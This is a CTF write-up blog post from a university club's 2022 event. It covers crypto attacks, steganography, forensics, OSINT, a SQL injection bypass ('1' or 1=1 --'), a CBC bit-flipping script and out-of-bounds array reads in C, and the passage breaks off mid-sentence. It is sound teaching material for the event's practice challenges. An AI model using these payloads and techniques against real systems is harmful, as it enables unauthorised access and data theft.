---
title: "Neuland CTF 2022 Spring"
author: ["0xFFD700", "manuv"]
date: 2022-04-09T22:30
published: true
tags:
- ctf
- writeup
- security
- cyber
- cybersecurity
---

On the 2nd of April, Neuland held it's first own CTF in the Technische Hochschule Ingolstadt. About 40 participants spent the following 8 hours solving challenges and making new friends. To round off the event, we wrote a blog post detailing the solutions to the challenges. If you want to try them yourself, here is the link to the corresponding [GitHub repository](https://github.com/neuland-ingolstadt/Neuland-CTF-2022). Have fun!

# **Cryptography**

</br>

## RSA - Easy

*Can you read my secret message?*
</br>

```
c: 3659175445595891578224956514800577143470123959736033284753586380604765644888785047353234225884268524868130423207412760208709937645278097199257596718082197770232653
e: 65537
n: 7234982060278593612743772588544839368196822773938312383630097619428475995024256036322651540252528422237410644498393424811350166970040550612292749721636427996110217
```
</br>

Our problem looks like RSA, since n is a relatively small number, we have a good chance of finding its two prime factors.
[FactorDB](http://factordb.com/index.php) has the factors which are q = 881232631 and p = 8210070537297879080403427081611143117323832705348733714367072296291847135452087039571565229808799967414518771375811008536462339613523174917807542832167807.
We know n, e, q and p which can be used to decrypt the message.
Let's take a closer look at how RSA works.

**Key Generation:**
1. Select  p,q (prime numbers and p!=q)
2. Calculate n = p * q
3. Calculate phi(n) = ( p - 1 ) * ( q - 1 )
4. Select integer e       GCD ( ϕ(n) , e ) = 1; 1 < e < ϕ(n)
5. Calculate d = inverse(e) % ϕ(n)
6. Public Key {e,n}
7. Private Key {d,n}

**Encryption:** C = pow( M , e) % n

**Decryption:**  M = pow(C , d) % n

**Python script:**
```
from Crypto.Util.number import *

p = 881232631
q = 8210070537297879080403427081611143117323832705348733714367072296291847135452087039571565229808799967414518771375811008536462339613523174917807542832167807
n = 7234982060278593612743772588544839368196822773938312383630097619428475995024256036322651540252528422237410644498393424811350166970040550612292749721636427996110217
c = 3659175445595891578224956514800577143470123959736033284753586380604765644888785047353234225884268524868130423207412760208709937645278097199257596718082197770232653
e = 65537

# decrypt
d = inverse(e,(p-1)*(q-1))
m = pow(c,d,p*q)
print("Message: ", long_to_bytes(m))
```

The flag is ```nland{254_15_n07_50_84d}```.

</br>

## Multi Time Pad - Easy

*A friend said he "padded" the following message and says this cryptography is UNBREAKABLE!!! I know he does not like long keys though, so maybe you can decrypt the message?*
</br>

One time pad is a common encryption technique. In fact it is one of the only ones which are proven to be uncrackable when used correctly. For a correct usage a message M is XOR'ed with a same length key K to result in a ciphertext C:

`C = M ⊕ K`

With XOR the following holds true:
- `A ⊕ B = C`
- `A ⊕ C = B`
- `B ⊕ C = A`

Thus when one knows the ciphertext and the plaintext the key can be calculated using C XOR M = K

The task name and descriptions hints that incontrary to correct one time pad usage the key is in fact shorter (which means a smaller key is repeated to fit the length of the message).

We know our plaintext starts with `nland{`, thus we can XOR the plaintext with the ciphertext to retrieve the first 6 bytes of the key:

[Using CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'nland%7B'%7D,'Standard',false)To_Hex('Space',0)&input=N2QgNWIgYTEgYjAgNzcgNGMgYjggZWUgNjEgMWEgZjEgYWQgM2UgNTkgZjAgYWEgM2UgMDYgZWQgYWEgMjIgNWEgZjMgZjMgNjMgMDMgYTQgYTM), result: `13 37 c0 de 13 37`

As we can see the key seems to repeat itself after 4 bytes, XOR'ing our message with the key `13 37 c0 de` we get the flag:

[Using CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'13%2037%20c0%20de'%7D,'Standard',false)&input=N2QgNWIgYTEgYjAgNzcgNGMgYjggZWUgNjEgMWEgZjEgYWQgM2UgNTkgZjAgYWEgM2UgMDYgZWQgYWEgMjIgNWEgZjMgZjMgNjMgMDMgYTQgYTM), result: `nland{x0r-1s-n0t-1-t1m3-p4d}`

</br>

## Flipdot - Medium

*To be extra secure, we started to AES encrypt our usernames and passwords.
Now we can tell you that the password for the Encryption server is "password123" and the username is "root" and you still can't log in.*
</br>

**Sourcecode:**
```
key = get_random_bytes(16)
iv = get_random_bytes(16)


def encrypt_data(data):
	padded = pad(data.encode(),16,style='pkcs7')
	cipher = AES.new(key, AES.MODE_CBC,iv)
	enc = cipher.encrypt(padded)
	return enc.hex()

def decrypt_data(encryptedParams):
	cipher = AES.new(key, AES.MODE_CBC,iv)
	paddedParams = cipher.decrypt( unhexlify(encryptedParams))
	print(paddedParams)
	if b'root&password=password123' in unpad(paddedParams,16,style='pkcs7'):
		return 1
	else:
		return 0

def send_msg(s, msg):
	enc = msg.encode()
	s.send(enc)

def login(s):
	send_msg(s,'\nLogin with auth ciphertext: ')

	enc_msg = s.recv(4096).decode().strip()
	
	try:
		check = decrypt_data(enc_msg)
	except Exception as e:
		send_msg(s, str(e) + '\n')
		s.close()

	if check:
		send_msg(s, '\nLogged in! \n'+ FLAG)
		s.close()
	else:
		send_msg(s, 'Auth ciphertext is incorrect!\n')
		s.close()
		
def createAuth(s):
	send_msg(s, '\nUsername: ')
	user = s.recv(4096).decode().strip()

	send_msg(s, 'Password: ' )
	passwd = s.recv(4096).decode().strip()

	msg = 'username=' + user +'&password=' + passwd

	try:
		assert('username=root&password=password123' not in msg)
	except AssertionError:
		send_msg(s, 'Good try but we are security experts!\n')
		return
		raise

	msg = 'auth:  username=' + user +'&password=' + passwd
	send_msg(s, 'Auth ciphertext: ' + encrypt_data(msg)+'\n')
	return
```

Since the code only filters for **root&password=password123'** and AES is a Blockcipher, we can try to trick the Server into generating us the correct hash. The first block (i.e. the first 16 bytes) of this ciphertext is the ciphertext of username=, the ciphertext of this block is also the IV for our second block (CBC Mode). In decryption mode the IV is XORed with the result of the decryption function, we can thus modify bits in the second block by flipping the corresponding bit in the IV.

![](../../src/blog/images/neuland-ctf-04-2022/flipdot.webp)
</br>

**Python script:**
```
k = '<qoot + password123 ciphertext>'

from binascii import unhexlify, hexlify

c = unhexlify(k)
cc = ord('r') ^ ord('q')
ccc = hexlify(bytearray([c[0] ^ cc]) + c[1:])
print(ccc)
```

The flag is ```nland{810ck_c1ph325_423_fun}```.

</br>

## Relatively - Hard

*I send my friend the same message twice with a different module and public key, what is our secret?*

```
n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723
e1=0x1695a
c1=0x2c4ade78c8e09c9839942c45389f93156e0abb10879b66bbb881ee67189be24d0ffd54ba3c174eafa929ad9c552090de8a8f8ac8a7007f542ec82e2189a232014487f951972db530ceb9c9d2d2e0355e04c57adea1c1f40d0463162aa9b440fa54d9455da512397d0526716aad1fbb839181c1dc1532a10ca5504a8e09082d8e
n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63
e2=0x1f9096
c2=0xb7cc89df7788b0fb68c941628fd89529c78d15fe913162c2363d639265c7f8641628437916179a8f3165bbbbdeb36a7dbca5af8787a4ccf3e335543b52cf072e3c5ed41571dfae682e5f00b7a9a305ab4e756f4fcd10ae900d7b5af62de93518527c885731a1b82537a82ef125db984540fdac59ba1a4b59df1f414e285006ad
```
</br>

One of the requirements for RSA to be secure is to choose an encryption exponent e that is coprime with φ(n) otherwise there is no unique way to decrypt a message.

Let's test if our e and φ(n) are not relatively prime:

k1 = gcd(e1,(p1-1)\*(q1-1)) == 2  </br>
k2 = gcd(e2,(p2-1)\*(q2-1)) == 2  </br>
--> e is dividable by 2  </br>

t1 = (p1-1)\*(q1-1)  </br>
t2 = (p2-1)\*(q2-1)  </br>
--> has to be devideable by 2  </br>

With at least one common factor found, we can use the Chinese Remainder Theorem to decrypt the cipher.

**Sourcecode:**
```
from Crypto.Util.number import *
import gmpy2
import binascii
import math 

n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723
e1=0x1695ea #(2 * 3 * 5 * 49339)
c1=0x2c4ade78c8e09c9839942c45389f93156e0abb10879b66bbb881ee67189be24d0ffd54ba3c174eafa929ad9c552090de8a8f8ac8a7007f542ec82e2189a232014487f951972db530ceb9c9d2d2e0355e04c57adea1c1f40d0463162aa9b440fa54d9455da512397d0526716aad1fbb839181c1dc1532a10ca5504a8e09082d8e
n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63
e2=0x1f9096 #(2 * 31 * 5 * 6673)  
c2=0xb7cc89df7788b0fb68c941628fd89529c78d15fe913162c2363d639265c7f8641628437916179a8f3165bbbbdeb36a7dbca5af8787a4ccf3e335543b52cf072e3c5ed41571dfae682e5f00b7a9a305ab4e756f4fcd10ae900d7b5af62de93518527c885731a1b82537a82ef125db984540fdac59ba1a4b59df1f414e285006ad

# Calculating the common factor if n1 and n2
p = math.gcd(n1,n2)
q1 = n1//p
q2 = n2//p

# Calculating the greatest factor of e and φ(n)
e1 = e1//math.gcd(e1,(p-1)*(q1-1))
e2 = e2//math.gcd(e2,(p-1)*(q2-1)) 

# Calculating the private keys
φ1 = (p-1)*(q1-1)
φ2 = (p-1)*(q2-1)
d1 = gmpy2.invert(e1,φ1)
d2 = gmpy2.invert(e2,φ2)

# Decrypting the cipher
f1 = pow(c1,d1,n1)
f2 = pow(c2,d2,n2)

#Chinese Remainder Theorem ref: https://github.com/findneo/RSA-ATTACK/blob/master/rsattack/rsattack.py
def GCRT(mi, ai):
    curm, cura = mi[0], ai[0]
    for (m, a) in zip(mi[1:], ai[1:]):
        d = math.gcd(curm, m)
        c = a - cura
        K = c // d * gmpy2.invert(curm // d, m // d)
        cura += curm * K
        curm = curm * m // d
        cura %= curm
    return (cura % curm, curm)


f3,lcm = GCRT([n1,n2],[f1,f2])
n3 = q1*q2
c3 = f3%n3
φ3 = (q1-1)*(q2-1)

# Because e and φ(n) both have the common factor 2
ding = 10//math.gcd((q1-1)*(q2-1),10) 
d3 = gmpy2.invert(ding,φ3) 
m3 = pow(c3,d3,n3)

# Flag
flag = gmpy2.iroot(m3,2)[0]
print(binascii.unhexlify(hex(flag)[2:].strip("L")))
```

The flag is ```nland{R3latively_Prim3}```.

</br>

# **Steganography**

</br>

## Cookbook - Easy

*Each recipe requires several ingredients.*
</br>

```
NjEgNzkgNmUgNjEgNzEgN2IgN2EgNjggMzEgMzcgMzEgNWYgNzMgMzQgNzAgMzcgMzAgMzIgNWYgMzMgNjEgNzAgMzAgNzEgMzEgNjEgMzkgN2Q=
```
</br>

The flag seems to be encoded, a good open source tool to solve these kinds of challenges is [CyberChef](https://gchq.github.io/CyberChef).

The **=** at the end indicates base64. From Base64 gives us 

```
61 79 6e 61 71 7b 7a 68 31 37 31 5f 73 34 70 37 30 32 5f 33 61 70 30 71 31 61 39 7d
```  

The string only contains numbers and letters up to F which is a pretty clear sign for hex. 
From Hex gives us
``` 
aynaq{zh171_s4p702_3ap0q1a9}
``` 

It already looks like a flag, but the characters are a bit off, let's try to shift them with the Caesar Cipher. 
From Rot13 gives us
``` 
nland{mu171_f4c702_3nc0d1n9}
``` 

</br>

## Blindspot - Medium

*The quieter you become, the more you are able to see.*
</br>

![](../../src/blog/images/neuland-ctf-04-2022/blindspot.webp)
</br>

Some dots seem to have a thinner rim and look like braille. If we translate them, it spells **agruizlke**. After taking a closer look at the picture itself, it seems to contain something. We can try to extract it with [Steghide](http://steghide.sourceforge.net/) ```steghide extract -sf blindspot.webp``` . The extracted text file contains the flag.
```
nland{72y_h42d32}
```

</br>

## Pillowtalk - Hard

*Maybe it would have been easier to put my secret into pastebin.*
</br>

![](../../src/blog/images/neuland-ctf-04-2022/pillowtalk.webp)

In the upper left corner of the picture, we can see a faint red line. When we open the image and look at the individual pixels in the Python library PIL, we can see that the red line consists of ((200,50,50,50) and (200,50,51,50)).

We can parse out the 1 and 0 with a simple Python script.
```
from PIL import Image
import matplotlib.pyplot as plt

im = Image.open('pillowtalk.webp')
pixelMap = im.load()

img = Image.new( im.mode, im.size)
pixelsNew = im.load()

flag = ""

for x in range(100,204):
    s = pixelMap[100,x]
    if(s[2] == 51):
        flag += "1"
    else:
        flag += "0"

print(flag)
```

The result can be converted from binary to a string with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDExMDExMTAwMTEwMTEwMDAxMTAwMDAxMDExMDExMTAwMTEwMDEwMDAxMTExMDExMDAxMTAxMTEwMDExMDEwMDAwMTEwMDAxMDExMDEwMTEwMDExMDAxMTAxMTEwMDEwMDExMTExMDE).

The flag is ```nland{741k3r}```.

</br>

# **Forensic**

</br>

## Wireshark - Easy

*Someone didn't follow best practices.*
</br>

[capture.pcapng](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Spring/blob/49068889e27dc990e688f7e475e1adb82633c35f/CTF%20Aufgaben/forensic/Wireshark%20-%20Easy/capture.pcapng)
</br>

The fastest way to search for the flag in a few hundred network packages is strings and grep:
```
strings capture.pcapng | grep nland
```

The command found a string
```
username=admin&password=nland%7Bl375-3ncryp7-3v3ry7h1n6%7D
```

HTML decode the last part  ```nland%7Bl375-3ncryp7-3v3ry7h1n6%7D``` and get the flag ```nland{l375-3ncryp7-3v3ry7h1n6}```.

</br>

## Malware - Easy

[malware.xlsm](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Spring/blob/49068889e27dc990e688f7e475e1adb82633c35f/CTF%20Aufgaben/forensic/Malware%20-%20Easy/malware.xlsm)

When we start up the Excel file we get a prompt to "Enable Editing" if we allow it a bunch of Notepads with the string "Hello World" are spawned.

Looks like a Macro is doing this, so let's take a look into the Excel Developer Environment.

```Private Sub Workbook_Open()
Dim te326c28addaf80f699486c4496e30371 As Integer
For te326c28addaf80f699486c4496e30371 = 0 To 10
r142f7e7f322058864384930b671c0730 = Shell("Notepad", vbNormalFocus)
SendKeys "Hello World", True
Next te326c28addaf80f699486c4496e30371
ActiveWorkbook.Sheets("Tabelle1").Range("A1").Value = "nland{"
For te326c28addaf80f699486c4496e30371 = 0 To 10
r142f7e7f322058864384930b671c0730 = Shell("Notepad", vbNormalFocus)
SendKeys "Hello World", True
Next te326c28addaf80f699486c4496e30371
r142f7e7f322058864384930b671c0730 = Shell("Notepad", vbNormalFocus)
SendKeys "m41w423", True
For te326c28addaf80f699486c4496e30371 = 0 To 10
r142f7e7f322058864384930b671c0730 = Shell("Notepad", vbNormalFocus)
SendKeys "Hello World", True
Next te326c28addaf80f699486c4496e30371
' _0nfu5c4710n}
For te326c28addaf80f699486c4496e30371 = 0 To 10
r142f7e7f322058864384930b671c0730 = Shell("Notepad", vbNormalFocus)
SendKeys "Hello World", True
Next te326c28addaf80f699486c4496e30371
End Sub
```

Between the "Hello World"-Loops, we have a function printing **nland{** in cell A1. Another function that prints **m41w423** into a Notepad and lastly a comment with the string **_0nfu5c4710n}**.

The flag is ```nland{m41w423_0nfu5c4710n}```.

</br>

## Call me - Medium

*I'm sure I shared the flag with a friend, maybe you can find!*
</br>

[backup.ab](https://github.com/neuland-ingolstadt/Neuland-CTF-2022-Spring/blob/49068889e27dc990e688f7e475e1adb82633c35f/CTF%20Aufgaben/forensic/Call%20me%20-Medium/backup.ab)

</br>
An AB file is a backup of some or all of the data stored on a user's Android device. We can use the Android Debug Bridge (ADB) with the command 
```java -jar abp.jar unpack backup.ab backup.zip```
to extract the files.

The challenge description gives us the hint that the flag was shared with a friend. Let's take a look at the SMS App under **backup/apps/com.android.providers.telephony/databases/mmssms.db**. Here we can find a database containing all SMS communication.
A simple 
```strings mmssms.db```
reveals all the messages including
```The password is "6e 6c 61 6e 64 7b 6d 30 38 31 31 33 70 68 30 6e 33 7d 0a" I have formatted it in hex so no one can search for it!```

The flag is ```nland{m08113ph0n3}```.

</br>

## Fun with Flags - Hard

*Your buddy Masahiro sent you a flag.*

![](../../src/blog/images/neuland-ctf-04-2022/output-6.webp)
</br>

For this challenge you received a challenge text and a PNG-file. The image 
obviously depictures a flag and some quick research tells us, that the flag 
shown is the Flag of the association for 'Flags of the World', thus the title.
We also learn that there are five hints to solve the challenge, with 'EXIF' 
beeing the zeroth one.

The first step is therefor to run our preferred EXIF dumping tool on the file:
```bash
 % exiftool output-6.webp
ExifTool Version Number         : 12.16
File Name                       : output-6.webp
Directory                       : .
File Size                       : 4.6 KiB
File Modification Date/Time     : 2021:11:22 20:46:43+01:00
File Access Date/Time           : 2022:04:08 19:14:54+02:00
File Inode Change Date/Time     : 2021:11:22 20:46:43+01:00
File Permissions                : rwxrwxrwx
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 600
Image Height                    : 400
Bit Depth                       : 4
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Comment                         : We're no strangers to Exif.You know the rules 
and so do I.A full commitment's what I'm thinking of.You wouldn't get this 
(Hint 4) from any other guy..I just wanna tell you how I'm feeling. Gotta make 
you understand QR codes. Never gonna give you up. Never gonna let you down. 
Never gonna run around and desert you. Never gonna magic you cry. 
Never gonna say good bytes. Never gonna tell a lie and hurt you
Palette                         : (Binary data 48 bytes, use -b option to extract)
Warning                         : Unknown compression method 1 for hint
Hint                            : (Binary data 64 bytes, use -b option to extract)
Exif Byte Order                 : Little-endian (Intel, II)
User Comment                    : .............
Image Size                      : 600x400
Megapixels                      : 0.240
```

We found another hint and got rickrolled, very funny. The challenge has 
something to do with QR codes! That perfectly makes sense, since our buddy
Masahiro Hara is the inventor of QR codes.

Still, we need more information. This is a forensics challenge, after all.
Let's try our usual arsenal - file, strings, binwalk!

```bash
% file output-6.webp
output-6.webp: PNG image data, 600 x 400, 4-bit colormap, non-interlaced
% strings output-6.webp
IHDR
tEXtComment
We're no strangers to Exif
You know the rules and so do I
[...]
QW1hemluZyBjaHVuayBhaGVhZCwgdHJ5IGhvbGRpbmcgd2l0aCBib3RoIGhhbmRzLiAoSGludCAzKQ==
0PLTE
[...]
Forget steghide. This is no stego challenge. (Hint 1)
[...]
?z|`
F*U.V*^>
+N,;n
IEND
No, seriously. This ain't no stego challenge! (Hint 2)
% binwalk output-6.webp
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 600 x 400, 4-bit colormap, non-interlaced
625           0x271           gzip compressed data, maximum compression, last modified: 2021-11-22 19:46:43
701           0x2BD           TIFF image data, little-endian offset of first image directory: 8
1817          0x719           Zlib compressed data, default compression
```

Great, we got another two hints! The author assures us that this is no stego 
challenge so we can happily skip stegseek/steghide & co. But we need more 
information! The output of `strings` looks weird - there is a quite long 
ASCII-string ending on "==". This looks familiar! Indeed, it is base64 encoded. 
Let's decode:
```bash
% echo QW1hemluZyBjaHVuayBhaGVhZCwgdHJ5IGhvbGRpbmcgd2l0aCBib3RoIGhhbmRzLiAoSGludCAzKQ== | base64 -d
Amazing chunk ahead, try holding with both hands. (Hint 3)
```

Amazing, we already have 4 out of 5 hints! The amazing chunk ahead could be a 
Titanite Chunk, but it's not. It's a PNG-chunk instead, so we have to dump the 
structure of the png file. We can use an online [tool](https://www.nayuki.io/page/png-file-chunk-inspector) for that. We figure
that the chunk after the tEXt-chunk that gave us the hint is a PLTE and a zTXt 
chunk. Wikipedia tells us that zTXt is a compressed text chunk. We copy the 
chunk data into a file (`chunk.bin`) and inspect:
```bash
% xxd chunk.bin && file chunk.bin
00000000: 1f8b 0800 a3f3 9b61 02ff 0b29 cf4c 4e55  .......a...).LNU
00000010: 28c9 4855 c84d 2cce d651 48c9 2f4d ca81  (.HU.M,..QH./M..
00000020: 08a4 95e6 292a 182a 6416 2b18 e929 6878  ....)*.*d.+..)hx
00000030: 64e6 9528 986a 0200 9248 40f9 3000 0000  d..(.j...H@.0...
00000040: 0923 4224                                .#B$
chunk.bin: gzip compressed data, last modified: Mon Nov 22 19:46:43 2021, max compression, original size modulo 2^32 608314121
% gunzip < chunk.bin | xxd

gzip: stdin: decompression OK, trailing garbage ignored
00000000: 5477 6963 6520 7468 6520 6d61 736b 2c20  Twice the mask,
00000010: 646f 7562 6c65 2074 6865 2066 756e 2120  double the fun!
00000020: 3120 6973 2032 2e20 2848 696e 7420 3529  1 is 2. (Hint 5)
```

Phew! We now have collected all five hints. In summary:
- There is an amazing PLTE chunk (Hint 3)
- It aint no stego challenge (Hint 1 & 2)
- It has got something to do with QR codes (Hint 4)
- Something abouts masks. 1 is 2? (Hint 5)

Now comes to most tricky part. You need to recognize that the color palette of 
the image contains every color twice. Any capable graphic program (GIMP or 
Photoshop both work fine) can show you the color palette:

![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_1.webp)
</br>

We fiddle around a bit with he colors and suddenly a wild QR code appears:

![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_2.webp)
</br>

Almost there. The challenge has got one last trick up its sleeve. The QR code
doesn't scan yet. Also, we haven't used hint 5 yet. We need to learn more about
QR codes, so we head to our trusty Wikipedia. There we can learn, that QR codes
are not only used for vaccination certificates, but they also provide a [mask](https://en.wikipedia.org/wiki/QR_code)
(stupid pun, indeed).

We can now either implement QR codes by ourselves (which is a lot of work honestly!),
or use a debugger tool such as the [QRazyBox](https://merricx.github.io/qrazybox/). We load up the image, open the 
tool drawer and select the Format Info Bruteforcing tool.

![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_3.webp)
</br>

We hit the "Decode"-button and finally receive the well-earned flag. The 
specified mask (Code 1) turned out to actually be mask 2.

![](../../src/blog/images/neuland-ctf-04-2022/fun_with_flags_4.webp)

</br>

# **OSINT**

</br>

## Campus Life - Baby

*Sometimes, newsletters contain essential information.*
</br>

The flag is hidden in the latest issue of the University Campus Life E-Mail newsletter with the title "Newsletter 02/Sommer '22". There is an entry advertising the Neuland CTF with the flag at the end.

![](../../src/blog/images/neuland-ctf-04-2022/campus_life.webp)

</br>

## Office  - Easy

*We left our access keys at the office. Maybe it's time for a walk?*
</br>

We can find the flag taped to the window of the Neuland Office.

![](../../src/blog/images/neuland-ctf-04-2022/office.webp)

</br>

## Setup - Easy

*The hacker "0xc0c0c0c" has been quite active on social media lately.*
</br>

A quick google search leads us to a [Twitter Account](https://twitter.com/0xc0c0c0c) with the mentioned name. When scrolling through the recent posts, we can find a picture of a desk setup. 

![](../../src/blog/images/neuland-ctf-04-2022/setup.webp)

You can see a Post-it sticking to the screen with the flag written on it.

The flag is ```nland{0p324710n5_53cu217y}```.

</br>

## Klotzkette   - Easy

*Oh no, the hackerman stole our money :(*
</br>

![](../../src/blog/images/neuland-ctf-04-2022/IvanKalashnik.webp)
</br>

For this challenge you received a challenge text and a PNG-file. The image 
depictures a Matrix-style avatar of some sort. We might already recognize this
as an Reddit avatar, and with the filename we notice a user /u/IvanKalashnik.
You can already do a reverse image search on Google on the avatar and it should
bring you to the same site.

Ivan Kalashnik has one posting on Reddit, an obvious ethereum "giveaway" scam.
There he mentions a wallet address: `0x00Bfeb18489e4437f11c3594aaDcf56Cad9Fa458`.

We pull over to the Ethereum Blockchain [Explorer](https://etherscan.io/), search for the address and 
find exactly ... *zero* transactions. Damn it! 

But wait, there was a hint in the reddit thread. Ivan tells us something about 
a mainnet (crossed out). Indeed, there is a button that searches for 
transactions on other chains besides the mainnet and curiously, there is one 
transaction on Ropsten, the PoW testnet.

We inspect the transaction but nothing shows up immediately. However, the 
transferred amount is weird. 0.00 Ether? Why would Ivan pay for gas, if he has 
no value to transfer? We do some research and learn, that you mostly see such 
transactions to trigger a smart contract with some input data. Etherscan shows
us the input data if we expand the view and indeed, there is some input data 
there. Now we only need to decode the hex-data as an ASCII string and we 
successfully retrieved the flag.

The flag is ```nland{c4n7_h1d3_7h3_bl0ckz}```.

</br>

## Wireless   - Easy

*You can't see it, you can't taste it, but there is something in the air.*
</br>

There is a ESP32 BLE server called "Neuland Surveillance Device" in the room.
You need to connect to it and read the only characteristic, which contains the flag.

![](../../src/blog/images/neuland-ctf-04-2022/wireless.webp)

The flag is ```nland{d0n7-f0r637-70-fl055}```.

</br>

## Certificate Transparency   - Easy

*Have we updated our certificates recently? Transparency is important.*
</br>

We can find the flag by looking up the Certificate with https://crt.sh/. For **informatik.sexy** we find the entry **https://ctf-flag.informatik.sexy/** which holds the flag.

![](../../src/blog/images/neuland-ctf-04-2022/certificate_transparency.webp)

The flag is ```nland{7r4n5p4r3ncy-15-k3y} ```.

</br>

## Social engineering - Medium

*Flag:* 
```
nland{<name of Simon's pet>_<last name of the on call employee>_<first name of the website author>}
```
*Hint: The flag is written in all lowercase.*

![](../../src/blog/images/neuland-ctf-04-2022/social_engineering.webp)
</br>

For the first part of the flag we need to take a look at the linked [Instagram of Simon Etsukos](https://www.instagram.com/simon.etsuko/) which includes a picture of his cat titled *Bodo*. 

The second part is hidden in the metadata of the Website. If we inspect the HTML code, we can find 
```<meta name="author" content="*Ada* Lovelace" />```.

For the last piece of the puzzle, we have to call the referenced phone number, which has a voicemail message telling us that the employee on call is called Mr *Nagel*.

The flag is ```nland{bodo_nagel_ada}```.

</br>

# **Web**

</br>

## Super Secure Login - Easy

*We need to get to our access code.*
</br>

![](../../src/blog/images/neuland-ctf-04-2022/super_secure_login.webp)

We can find the flag by inspecting the index.html file.

```
<!DOCTYPE html>
<html>
    <head>
        <title>Login</title>
        <script>
            function verify() {
                const username = document.getElementsByName('username')[0].value
                const password = document.getElementsByName('password')[0].value
                if (username == 'admin' && password == '5d82dabd-dcfa-4243-9c9f-f743d5ce764d') {
                    document.write('nland{fea7cf41-ad4c-4de6-952b-4e8085d08b00}')
                } else {
                    document.write('Wrong username and/or password')
                }
            }
        </script>
    </head>
    <body>
        <form method="POST" onsubmit="verify()">
            Username: <input type="text" name="username"><br />
            Password: <input type="password" name="password"><br />
            <input type="submit" value="Login">
        </form>
    </body>
</html> 
```

The flag is ```nland{fea7cf41-ad4c-4de6-952b-4e8085d08b00}```.

</br>

## Super Secure User Check  - Easy

*I lost my access codes. How can I get them back?*
</br>

![](../../src/blog/images/neuland-ctf-04-2022/super_secure_user_check.webp)
</br>

We can solve the challenge with an always true injection **1' or 1=1 --**. The Query in the background should look something like this
```
SELECT select_list FROM table_name WHERE username = '1' or 1=1 --' AND password ='1' or 1=1 --'
```
Since we commented out the actual password and username request to the Database, the query test for **1=1** which is always true and grants us access.

The flag is ```nland{f0f4d87c-97b9-4390-9567-3df819fa0c25}```.

</br>

# **Pwn**

</br>

## Lecture Pick - Easy

*Your university set up this server allowing you to pick a lecture. Can you extract the secret information?*
</br>

**Sourcecode:**
```
#include <stdio.h>

#define FLAG "nflag{dummy-flag-for-testing}"

int main() {
    const char *flag = FLAG;
    const char *courses[8] = {
        "Maths 1",
        "Maths 2",
        "Object Oriented Programming",
        "Computer Vision",
        "IT-Security",
        "Forensics",
        "Software Engineering",
        "Theoretical Computer Science",
    };

    printf("Courses:\n");
    for(int i = 0; i < 8; i++) {
        printf("  - %s\n", courses[i]);
    }

    printf("\n");
    printf("Pick one: ");
    fflush(stdout);

    long x = 0;
    scanf("%ld", &x);
    printf("You picked %s\n", courses[x]);

    return 0;
}
```

The variable `flag` holds a pointer to the string we want to print. It is located on the stack directly next to the `courses` array. The user can input an integer `x` after which `courses[x]` is printed. There is no boundary check for the value entered for `x`, thus a value smaller than 0 or bigger than the length of the array can be entered.

Depending on the order of `flag` and `courses` on the stack (influenced by the compiler) the solution is to either input `-1` or `8`.

</br>

## Lecture Pick - Medium

*Your university set up this server allowing you to pick a lecture. This time the secret does not seem to be on the Stack. Can you still extact it?*
</br>

**Sourcecode:**
```
#include <stdio.h>

const char *flag = "nflag{dummy-flag-for-testing}";

int main() {
    const char *courses[8] = {
        "Maths 1",
        "Maths 2",
        "Object Oriented Programming",
        "Computer Vision",
        "IT-Security",
        "Forensics",
        "Software Engineering",
        "Theoretical Computer Science",
    };

    printf("Courses [%p]:\n", courses);
    for(int i = 0; i < 8; i++) {
        printf("  - [%p] %s\n", courses[i], courses[i]);
    }

    printf("\n");
    printf("Pick one: ");
    fflush(stdout);

    long x = 0;
    scanf("%ld", &x);

    printf("You picked %p\n", courses[x]);

    return 0;
}
```

The variable `courses` holds a list of string pointers. We know that strings are readonly arrays of chars. All strings are located in the `.text` segment of the program. As the flag is also a string constant in the program it is also located somewhere in this section. The program prints the addresses of `courses` which is on the stack, as well as the addresses of all course strings which are in `.text`. Afterwards the result of the `courses[x]` expression is printed as a 4 byte hex number (using the `%p` formatting on 32 bit machines). Given the adress of `courses` as e.g. `0xffa2dd0c` and `x` as `3` the expression `courses[x]` effectively loads 4 bytes from the address `courses + 4 * x` which is `0xffa2dd0c + 4 * 3`. Given the address of the String `"Maths 1"` as e.g. `0x56591032` we can calculate an `x` in order to read four bytes from the text segment: `(0x56591032 - 0xffa2dd0c) / 4 = -710046518,5`. Entering `-710046518` for x we should be able to read bytes 2-6 of the `"Maths 1"` string, which should be `ths `. The program outputs `0x20736874`, which we can convert to a string by changing the byte order (little endian read from linear array) and then interpreting each byte as a hex encoded 